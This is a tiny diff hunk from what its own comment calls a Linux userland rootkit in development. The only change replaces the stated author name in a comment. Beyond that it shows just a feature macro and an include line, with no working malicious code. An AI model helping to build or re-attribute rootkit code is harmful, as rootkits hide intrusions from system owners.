@@ -1,5 +1,5 @@
 // my rootkit userland for linux.
-// author: Darksec, in development phase
+// author: NullByte, in development phase
 
 #define _GNU_SOURCE
 #include <sys/wait.h>
